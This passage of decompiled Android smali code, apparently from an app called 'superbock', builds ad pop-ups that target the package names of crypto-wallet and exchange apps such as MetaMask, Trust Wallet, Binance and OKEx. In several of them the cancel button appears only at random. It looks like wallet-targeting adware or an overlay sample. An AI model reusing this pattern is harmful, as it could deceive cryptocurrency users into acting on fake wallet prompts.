    goto :goto_2

    :cond_6
    const/4 v3, 0x0

    :goto_2
    if-eqz v3, :cond_7

    const-string v3, "55"

    invoke-static {v4, v3, v5}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :cond_7
    iget-object v3, v0, Lf3/i$a;->h:Landroid/content/Context;

    if-nez p3, :cond_a

    sget-object v5, Lk3/f;->l:Ljava/util/HashMap;

    invoke-virtual {v5, v1}, Ljava/util/HashMap;->containsKey(Ljava/lang/Object;)Z

    move-result v5

    invoke-static {}, Lg3/l;->c()Lg3/l;

    move-result-object v7

    invoke-virtual {v7, v1}, Lg3/l;->b(Ljava/lang/String;)Lcom/superbock/bean/KInfo;

    move-result-object v7

    if-eqz v7, :cond_8

    const/4 v6, 0x1

    :cond_8
    if-eqz v5, :cond_9

    if-ne v6, v4, :cond_a

    :cond_9
    invoke-static {v1, v2, v5, v6}, Lf3/i;->l(Ljava/lang/String;III)V

    goto/16 :goto_1b

    :cond_a
    const-string v1, "2,28,49"

    const-string v4, "adInfo"

    const-string v5, "2131165378"

    const-string v6, "com.tronlinkpro.wallet"

    const/16 v7, 0x6a

    const v8, 0x7f0f0104

    const v9, 0x7f0f0105

    const v10, 0x7f0f0106

    if-eq v2, v7, :cond_3d

    const/16 v7, 0x6b

    const-string v11, "2131165377"

    const-string v12, "com.tronlink.global"

    if-eq v2, v7, :cond_3b

    const-string v7, "vip.mytokenpocket"

    const-string v8, "5,0,255"

    const-string v9, "2131492888"

    const-string v10, "com.wallet.crypto.trustapp"

    const-string v13, "30,144,255"

    const-string v14, "255,255,255"

    const-string v15, "41,128,254"

    const-string v0, "2131492879"

    move-object/from16 p1, v5

    const-string v5, "2131492872"

    move-object/from16 p3, v11

    const-string v11, "2131492885"

    move-object/from16 v16, v9

    const-string v9, "io.metamask"

    move-object/from16 v17, v11

    const-string v11, "im.token.app"

    packed-switch v2, :pswitch_data_1

    move-object/from16 v18, v5

    const-string v5, "128,128,128"

    move-object/from16 v19, v0

    const-string v0, "105,105,105"

    move-object/from16 v20, v8

    const-string v8, "2131492891"

    move-object/from16 v21, v8

    const-string v8, "org.toshi"

    move-object/from16 v22, v10

    const/4 v10, 0x3

    packed-switch v2, :pswitch_data_2

    move-object/from16 v6, v20

    move-object/from16 v5, v22

    const-string v1, "openapp:"

    move-object/from16 v20, v11

    const-wide/16 v10, 0x1388

    packed-switch v2, :pswitch_data_3

    goto/16 :goto_1b

    :pswitch_2
    const/4 v1, 0x2

    invoke-static {v1}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v1

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v2, 0x68

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_b

    move-object v0, v2

    :cond_b
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v0, 0x9

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f00ba

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f00b9

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f00b8

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v0, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_3
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v0

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v1, 0x67

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v11}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v0}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_c

    move-object v5, v1

    :cond_c
    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v1, 0x9

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v1, 0x7f0f0085

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v1, 0x7f0f0084

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v1, 0x7f0f0083

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v0, v13}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v4, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v1}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_4
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v0

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v1, 0x66

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v7}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v0}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_d

    move-object v11, v1

    goto :goto_3

    :cond_d
    move-object/from16 v11, v17

    :goto_3
    invoke-virtual {v0, v11}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v1, 0x9

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v1, 0x7f0f0100

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v1, 0x7f0f00ff

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v1, 0x7f0f00fe

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v0, v15}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v4, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v1}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_5
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v0

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v1, 0x65

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v10}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v0}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_e

    move-object v9, v1

    goto :goto_4

    :cond_e
    move-object/from16 v9, v16

    :goto_4
    invoke-virtual {v0, v9}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v1, 0x9

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v1, 0x7f0f010c

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v1, 0x7f0f010b

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v1, 0x7f0f010a

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v0, v8}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    invoke-virtual {v0, v14}, Lcom/superbock/bean/AdInfo;->setBgColor(Ljava/lang/String;)V

    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v1, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v4, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v1}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_6
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v1

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v2, 0xd1

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const-string v2, "com.okinc.okex.gp"

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_f

    goto :goto_5

    :cond_f
    const-string v0, "2131492882"

    :goto_5
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v0, 0x9

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f00e5

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f00e6

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f0003

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    const-string v0, "0,0,0"

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    const/4 v0, 0x1

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAlign(I)V

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x2

    invoke-virtual {v2, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    if-ne v2, v0, :cond_10

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v1, v5}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_10
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v2, 0x3f1

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v0, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_7
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v1

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v2, 0xd0

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const-string v2, "com.binance.dev"

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_11

    goto :goto_6

    :cond_11
    const-string v0, "2131492869"

    :goto_6
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v0, 0x9

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f0057

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f0058

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f000d

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    const-string v0, "0,0,0"

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    const-string v0, "240,185,11"

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    const/4 v6, 0x1

    if-ne v0, v6, :cond_12

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v1, v5}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_12
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v2, 0x3f0

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v0, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_8
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v6}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v6, 0xcf

    invoke-virtual {v2, v6}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v12}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_13

    move-object v11, v0

    goto :goto_7

    :cond_13
    move-object/from16 v11, p3

    :goto_7
    invoke-virtual {v2, v11}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v0, 0x9

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f0108

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f0086

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f0010

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v2, v14}, Lcom/superbock/bean/AdInfo;->setBgColor(Ljava/lang/String;)V

    invoke-virtual {v2, v14}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    const/4 v6, 0x1

    if-ne v0, v6, :cond_14

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_14
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v1, 0x3ef

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    invoke-virtual {v1, v10}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    const/4 v5, 0x1

    if-lt v1, v5, :cond_15

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_15
    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_9
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v7, 0xce

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v6}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_16

    goto :goto_8

    :cond_16
    move-object/from16 v0, p1

    :goto_8
    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v0, 0x9

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f0109

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f0086

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f0010

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v2, v14}, Lcom/superbock/bean/AdInfo;->setBgColor(Ljava/lang/String;)V

    invoke-virtual {v2, v14}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    const/4 v6, 0x1

    if-ne v0, v6, :cond_17

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_17
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

